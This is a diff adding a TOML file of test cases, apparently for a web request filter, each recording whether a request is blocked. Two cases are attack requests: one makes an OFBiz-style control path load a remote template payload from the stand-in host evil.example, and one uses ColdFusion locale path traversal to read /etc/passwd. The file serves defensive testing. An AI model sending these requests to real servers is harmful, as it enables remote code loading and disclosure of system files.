@@ -1,0 +1,54 @@
+[[case]]
+name = "remote-decorator-on-control-path"
+kind = "attack"
+via = "request"
+
+[case.request]
+method = "POST"
+uri = "/webtools/control/forgotPassword/StatsSinceStart"
+query = "statsDecoratorLocation=http%3A%2F%2Fevil.example%2Fofbiz%2Fpayload.xml"
+headers = { User-Agent = "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0", Accept = "text/html", Content-Type = "application/x-www-form-urlencoded" }
+
+[case.primary]
+effect = "block"
+rule = "request_template_source"
+
+[case.backport]
+effect = "block"
+rule = "request_template_source"
+
+[[case]]
+name = "locale-traversal"
+kind = "attack"
+via = "request"
+
+[case.request]
+method = "GET"
+uri = "/CFIDE/administrator/enter.cfm"
+query = "locale=../../../../../../../../../../etc/passwd%00en"
+headers = { User-Agent = "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0", Accept = "text/html" }
+
+[case.primary]
+effect = "block"
+rule = "request_template_source"
+
+[case.backport]
+effect = "none"
+why = "the backports accept only a remote URL as a template source, not a path traversal"
+
+[[case]]
+name = "benign-remote-decorator-outside-control-path"
+kind = "benign"
+via = "request"
+
+[case.request]
+method = "POST"
+uri = "/api/preferences"
+query = "statsDecoratorLocation=http%3A%2F%2Fevil.example%2Fofbiz%2Fpayload.xml"
+headers = { User-Agent = "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0", Accept = "text/html", Content-Type = "application/x-www-form-urlencoded" }
+
+[case.primary]
+effect = "none"
+
+[case.backport]
+effect = "none"
